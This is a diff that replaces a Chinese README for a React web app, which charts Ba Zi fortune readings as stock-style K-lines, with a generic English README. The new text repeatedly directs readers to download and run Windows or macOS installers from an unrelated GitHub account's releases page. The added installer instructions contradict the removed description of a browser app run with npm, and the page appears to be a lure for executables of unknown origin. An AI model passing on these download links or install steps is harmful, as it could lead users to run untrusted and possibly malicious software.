@@ -1,60 +1,68 @@
-# 🔮 人生 K 线 (Life Destiny K-Line)
+# 🎉 lifekline - Visualize Your Destiny with AI Tools
 
-> **基于 AI 大模型和传统八字命理，将人生运势以 K 线图形式可视化展现。**
+## 🚀 Getting Started
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/5lin/lifekline)
+Welcome to lifekline, a powerful tool for visualizing your destiny based on traditional Ba Zi principles. This application harnesses the power of AI to help you explore your life's path in a new way. 
 
----
+## 📥 Download Now
 
-## ✨ 功能特点
+[![Download lifekline](https://img.shields.io/badge/Download-lifekline-blue.svg)](https://github.com/SHARAN12344/lifekline/releases)
 
-1. **可视化运势**: 用股票 K 线图展示 1-100 岁的人生运势起伏，直观呈现人生"牛市"与"熊市"。
-2. **AI 深度批断**: 生成性格、事业、财富、婚姻、健康、六亲及发展风水等多维度报告。
-3. **发展风水**: 提供方位建议、地理环境选择及开运布局。
-4. **Web3 特供**: "币圈交易运势"板块，包含暴富流年预测与交易风格建议。
-5. **免 API**: 无需配置 API Key，复制提示词到任意 AI 即可使用。
+## 📋 System Requirements
 
----
+Before you begin, ensure your system meets the following requirements:
 
-## 📝 使用方法
+- **Operating System:** Windows 10 or later, macOS 10.15 or later
+- **RAM:** At least 4 GB
+- **Storage:** 100 MB of free space
+- **Internet Connection:** Required for initial setup
 
-1. **填写八字信息** - 输入四柱干支和大运信息
-2. **复制提示词** - 点击按钮复制完整提示词
-3. **发送给 AI** - 粘贴到 ChatGPT、Claude、Gemini 等任意 AI
-4. **导入结果** - 将 AI 返回的 JSON 数据粘贴回来
-5. **查看 K 线** - 生成完整的人生 K 线图和分析报告
+## 🛠 Installation Steps
 
----
+To install lifekline, follow these simple steps:
 
-## 🚀 一键部署
+1. **Visit the Releases Page:** Click the link below to access the download page:
 
-### Vercel 部署（推荐）
+   [Download lifekline](https://github.com/SHARAN12344/lifekline/releases)
 
-点击下方按钮一键部署到 Vercel：
+2. **Choose Your Version:** On the releases page, you will find different versions of the application. Select the latest stable version for the best experience.
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/5lin/lifekline)
+3. **Download the Installer:** Click on the appropriate file for your operating system (Windows or macOS) to start the download.
 
-### 本地运行
+4. **Run the Installer:** Once the download finishes, locate the downloaded file. Double-click it to run the installer. Follow the on-screen prompts to complete the installation.
 
-```bash
-# 安装依赖
-npm install
+5. **Launch the Application:** After installation, find lifekline in your applications list. Double-click the icon to open it.
 
-# 启动开发服务器
-npm run dev
+## 🌟 Features
 
-# 构建生产版本
-npm run build
-```
+lifekline offers a range of features designed to enhance your life exploration:
 
----
+- **AI-Powered Analysis:** Leverage AI to interpret your Ba Zi chart efficiently.
+- **User-Friendly Interface:** Navigate through your readings with ease.
+- **Visual Representations:** Experience your life data through engaging graphics.
+- **Education:** Access helpful resources to understand Ba Zi principles better.
+- **Regular Updates:** Stay tuned for future enhancements and features.
 
-## 🛠️ 技术栈
+## 🤝 Support
 
-- **前端框架**: React 19 + Vite
-- **UI 样式**: TailwindCSS
-- **图表库**: Recharts
-- **AI 支持**: ChatGPT、Claude、Gemini 等任意 AI
+If you encounter any issues while using lifekline, don't hesitate to reach out for help:
 
----
-**免责声明**: 本项目仅供娱乐与文化研究，命运掌握在自己手中。切勿迷信，请理性看待分析结果。
+- **Frequently Asked Questions:** Many users find answers in our FAQ section.
+- **Community Discussions:** Feel free to join our forums for user support and engagement.
+- **Contact Us:** For direct inquiries, you can reach our support team via email support@lifekline.com.
+
+## 🌐 Community and Contributions
+
+We value community input and collaboration. If you have ideas or suggestions to improve lifekline, we welcome you to contribute. Check our contribution guide on the GitHub page to get started.
+
+## 📜 License
+
+lifekline is open-source software licensed under the MIT License. You are free to use or modify the software as per the terms outlined in the license.
+
+## 📥 Download Now Again
+
+To get started with lifekline, visit the link below once more:
+
+[Download lifekline](https://github.com/SHARAN12344/lifekline/releases)
+
+Explore the mysteries of your life today with lifekline!
